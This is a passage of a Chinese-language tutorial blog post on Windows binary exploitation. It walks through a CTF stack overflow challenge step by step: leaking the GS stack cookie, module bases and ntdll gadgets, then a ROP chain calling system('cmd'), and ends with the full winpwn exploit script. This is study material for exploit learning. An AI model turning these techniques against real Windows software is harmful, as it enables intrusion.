+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.2 leak code_base</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">sd(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x118</span>)</span><br><span class="line">rl(<span class="string">&quot;a&quot;</span>*<span class="number">0x118</span>)</span><br><span class="line">code_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;code_addr&quot;</span>, code_addr)</span><br><span class="line">code_base = code_addr - <span class="number">0x12f4</span></span><br><span class="line">li(<span class="string">&quot;code_base&quot;</span>, code_base)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-21-24.png"
+                      alt="nipaste_2024-05-15_17-21-2"
+                ></p>
+<p><strong>step.3 leak ntdll_base addr</strong></p>
+<p>由于循环总共有三次所以第三次的时候程序会正常退出，所以我们这里需要拥有程序地址的基础上劫持程序的执行流，重新返回到main函数，再次利用栈溢出，并且<strong>重新泄露 stack_cookie</strong>，原因是劫持之后的 rsp 有所变化，需重新泄露。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite rip to control flow</span></span><br><span class="line">main_addr = code_base + <span class="number">0x1000</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span> + p64(main_addr)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># since security_cookie has changed (= rsp ^ cookie) we need leak again</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">sd(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">rl(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">stack_cookie2 = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie2&quot;</span>, stack_cookie2)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-22-13.png"
+                      alt="nipaste_2024-05-15_17-22-1"
+                ></p>
+<p>这里需要说明的是，在<strong>调用 main 之前 ntdll.dll 的地址，也会保存在栈里</strong>，所以在程序 gadget 有限的情况下，我们可以泄露出 ntdll.dll 的地址后，利用该库的 gadget。查看加载库地址命令<code>lwt</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-24-59.png"
+                      alt="nipaste_2024-05-15_17-24-5"
+                ></p>
+<p>可以看到在下面不久处存在一个 ntdll 的地址，同时在上面还有一个 KERNEL32.DLL 中的地址（这道题没用到）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-25-36.png"
+                      alt="nipaste_2024-05-15_17-25-3"
+                ></p>
+<p>下面我们就继续泄露出上图中的这个地址</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.3 leak ntdll_base addr (this addr will be saved in stack when call the main )</span></span><br><span class="line">sa(<span class="string">&quot;input:&quot;</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x180</span>)</span><br><span class="line">rl(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x180</span>)</span><br><span class="line">ntdll_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x000526b1</span></span><br><span class="line">li(<span class="string">&quot;ntdll_base&quot;</span>, ntdll_base)</span><br><span class="line"><span class="comment"># 0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000018008c7e7 : pop rdx ; pop r11 ; ret</span></span><br><span class="line">pop_rcx_ret = ntdll_base + <span class="number">0x01a853</span></span><br><span class="line">pop_rbx_ret = ntdll_base + <span class="number">0x0137d</span></span><br><span class="line">pop_rdx_r11_ret = ntdll_base + <span class="number">0x08c7e7</span></span><br></pre></td></tr></table></figure></div>
+
+<p>从下图也可以看到我们已经成功填充到了这里，从而就可以完成泄露了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-28-29.png"
+                      alt="nipaste_2024-05-15_17-28-2"
+                ></p>
+<p><strong>step.4 leak security_cookie</strong></p>
+<p>前面说过 canary 通过 rsp 异或 security_cookie 得到的，所以我们需要想办法泄露出该值，如果不泄露，我们会发现在后面随着布置的 ROP 链的执行，会导致 rsp 动态变化，从而导致会不通过后面的 check_security，<code>security_cookie </code> 值是直接保存在程序中的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-33-23.png"
+                      alt="nipaste_2024-05-15_17-33-2"
+                ></p>
+<p>上面的值，在程序加载到内存之后就会发生变化，泄露代码如下。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.4 leak security_cookie</span></span><br><span class="line">puts_got = code_base + <span class="number">0x2180</span></span><br><span class="line">call_puts = code_base + <span class="number">0x10A6</span></span><br><span class="line">security_cookie_addr = code_base + <span class="number">0x3008</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie2) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span></span><br><span class="line"><span class="comment"># make rbx == 1 to ensure the loop cotinue after puts(security_cookie)</span></span><br><span class="line">payload += p64(pop_rbx_ret) + p64(<span class="number">1</span>) + p64(pop_rcx_ret) + p64(security_cookie_addr) + p64(call_puts) </span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">rl(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">security_cookie = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;security_cookie&quot;</span>, security_cookie)</span><br><span class="line">stack_addr = stack_cookie ^ security_cookie</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br></pre></td></tr></table></figure></div>
+
+<p>在有了 security_cookie 之后我们还可以反算得到栈地址，后面会用到。</p>
+<p><strong>注意事项：</strong>这里之所以要将 rbx 设置为 1，是因为我们后面在执行完 call_puts 之后，依然可以进行一次循环输入payload 的机会，可以在 ida 中看一下这里的反汇编就会明白了。</p>
+<p>**step.5 leak ucrtbase_addr **</p>
+<p>这一步与前面例题 ret2dll 类似，可以参考上一题</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.5 leak ucrtbase_addr </span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp StackOverflow+0x10a6&#x27;)</span></span><br><span class="line">rsp1 = stack_addr + <span class="number">0x168</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(rsp1 ^ security_cookie) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rbx_ret) + p64(<span class="number">1</span>) + p64(pop_rcx_ret) + p64(puts_got) + p64(call_puts)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">ucrtbase_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">ucrtbase_addr -= <span class="number">0x0083d50</span></span><br><span class="line">li(<span class="string">&quot;ucrtbase_addr&quot;</span>, ucrtbase_addr)</span><br><span class="line">system = ucrtbase_addr + <span class="number">0xAE5C0</span></span><br><span class="line">cmd_addr = ucrtbase_addr + <span class="number">0xD0CB0</span></span><br><span class="line">li(<span class="string">&quot;system&quot;</span>, system)</span><br><span class="line">li(<span class="string">&quot;cmd_addr&quot;</span>, cmd_addr)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>step.6 hijack control flow</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.6 hijack control flow</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp StackOverflow+0x10a6&#x27;)</span></span><br><span class="line">rsp2 = stack_addr + <span class="number">0x2c8</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(rsp2 ^ security_cookie) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rcx_ret) + p64(cmd_addr) + p64(system)</span><br><span class="line">sd(payload)</span><br></pre></td></tr></table></figure></div>
+
+<p>最后也是成功跳转到了 system 这里。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-41-50.png"
+                      alt="nipaste_2024-05-15_17-41-5"
+                ></p>
+<p><strong>效果图：</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-15_17-43-36.png"
+                      alt="nipaste_2024-05-15_17-43-3"
+                ></p>
+<p><strong>final exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">re = <span class="keyword">lambda</span> data: io.recv(data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data: io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: io.sendline(data)</span><br><span class="line">rl = <span class="keyword">lambda</span> data: io.recvuntil(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> content, data: (io.recvuntil(content), io.send(data))</span><br><span class="line">sla = <span class="keyword">lambda</span> content, data: (io.recvuntil(content), io.sendline(data))</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">li = <span class="keyword">lambda</span> content,data : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + content + <span class="string">&#x27; == &#x27;</span> + <span class="built_in">hex</span>(data) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">file_name = <span class="string">&#x27;./StackOverflow.exe&#x27;</span></span><br><span class="line">io = process([file_name])</span><br><span class="line"><span class="comment"># io = remote()</span></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp StackOverflow+0x10a6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step.1 leak stack_cookie</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp StackOverflow+0x10a6&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">sd(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">rl(<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie&quot;</span>, stack_cookie)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.2 leak code_base</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">sd(<span class="string">&#x27;a&#x27;</span> * <span class="number">0x118</span>)</span><br><span class="line">rl(<span class="string">&quot;a&quot;</span>*<span class="number">0x118</span>)</span><br><span class="line">code_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;code_addr&quot;</span>, code_addr)</span><br><span class="line">code_base = code_addr - <span class="number">0x12f4</span></span><br><span class="line">li(<span class="string">&quot;code_base&quot;</span>, code_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite rip to control flow</span></span><br><span class="line">main_addr = code_base + <span class="number">0x1000</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span> + p64(main_addr)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># since security_cookie has changed (= rsp ^ cookie) we need leak again</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">sd(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">rl(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x100</span>)</span><br><span class="line">stack_cookie2 = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie2&quot;</span>, stack_cookie2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.3 leak ntdll_base addr (this addr will be saved in stack when call the main )</span></span><br><span class="line">sa(<span class="string">&quot;input:&quot;</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x180</span>)</span><br><span class="line">rl(<span class="string">&#x27;b&#x27;</span> * <span class="number">0x180</span>)</span><br><span class="line">ntdll_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">ntdll_base = ntdll_addr - <span class="number">0x000526b1</span></span><br><span class="line">li(<span class="string">&quot;ntdll_base&quot;</span>, ntdll_base)</span><br><span class="line"><span class="comment"># 0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000018008c7e7 : pop rdx ; pop r11 ; ret</span></span><br><span class="line">pop_rcx_ret = ntdll_base + <span class="number">0x01a853</span></span><br><span class="line">pop_rbx_ret = ntdll_base + <span class="number">0x0137d</span></span><br><span class="line">pop_rdx_r11_ret = ntdll_base + <span class="number">0x08c7e7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step.4 leak security_cookie</span></span><br><span class="line">puts_got = code_base + <span class="number">0x2180</span></span><br><span class="line">call_puts = code_base + <span class="number">0x10A6</span></span><br><span class="line">security_cookie_addr = code_base + <span class="number">0x3008</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(stack_cookie2) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span></span><br><span class="line"><span class="comment"># make rbx == 1 to ensure the loop cotinue after puts(security_cookie)</span></span><br><span class="line">payload += p64(pop_rbx_ret) + p64(<span class="number">1</span>) + p64(pop_rcx_ret) + p64(security_cookie_addr) + p64(call_puts) </span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">rl(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">security_cookie = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">li(<span class="string">&quot;security_cookie&quot;</span>, security_cookie)</span><br><span class="line">stack_addr = stack_cookie ^ security_cookie</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step.5 leak ucrtbase_addr </span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp StackOverflow+0x10a6&#x27;)</span></span><br><span class="line">rsp1 = stack_addr + <span class="number">0x168</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(rsp1 ^ security_cookie) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rbx_ret) + p64(<span class="number">1</span>) + p64(pop_rcx_ret) + p64(puts_got) + p64(call_puts)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">ucrtbase_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">ucrtbase_addr -= <span class="number">0x0083d50</span></span><br><span class="line">li(<span class="string">&quot;ucrtbase_addr&quot;</span>, ucrtbase_addr)</span><br><span class="line">system = ucrtbase_addr + <span class="number">0xAE5C0</span></span><br><span class="line">cmd_addr = ucrtbase_addr + <span class="number">0xD0CB0</span></span><br><span class="line">li(<span class="string">&quot;system&quot;</span>, system)</span><br><span class="line">li(<span class="string">&quot;cmd_addr&quot;</span>, cmd_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step.6 hijack control flow</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp StackOverflow+0x10a6&#x27;)</span></span><br><span class="line">rsp2 = stack_addr + <span class="number">0x2c8</span></span><br><span class="line">rl(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(rsp2 ^ security_cookie) + p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_rcx_ret) + p64(cmd_addr) + p64(system)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
+
+        </div>
+
+        
+            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Windows pwn 入门</li>
+        <li><strong>Author:</strong> henry</li>
+        <li><strong>Created at
+                :</strong> 2024-05-15 17:45:56</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-05-15 17:52:03
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://henrymartin262.github.io/2024/05/15/winpwn-入门/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/windows%EF%BC%8Cwinpwn%EF%BC%8C-stack%EF%BC%8Cgs%EF%BC%8C-ntdll%EF%BC%8Cucrtbase/">#windows，winpwn， stack，gs， ntdll，ucrtbase</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/05/11/angr-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">angr 学习笔记</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Windows pwn 入门</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-pwn"><span class="nav-text">Windows pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">windows 保护机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="nav-text">ssh 远程连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#stack-overflow"><span class="nav-text">stack overflow</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-pwntools-%E5%86%99exp"><span class="nav-text">利用 pwntools 写exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windbg-%E8%B0%83%E8%AF%95"><span class="nav-text">windbg 调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8winpwn%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"><span class="nav-text">利用winpwn模块进行调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windbg-%E5%B8%A6%E7%AC%A6%E5%8F%B7%E8%B0%83%E8%AF%95"><span class="nav-text">windbg 带符号调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2dll"><span class="nav-text">ret2dll</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81-dll"><span class="nav-text">常见 dll</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#win%E4%BC%A0%E5%8F%82%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">win传参寄存器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E7%A4%BA%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%90%84%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%EF%BC%88vmmap%EF%BC%89"><span class="nav-text">显示加载的各模块地址（vmmap）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qwb2020-easyoverflow"><span class="nav-text">qwb2020-easyoverflow</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
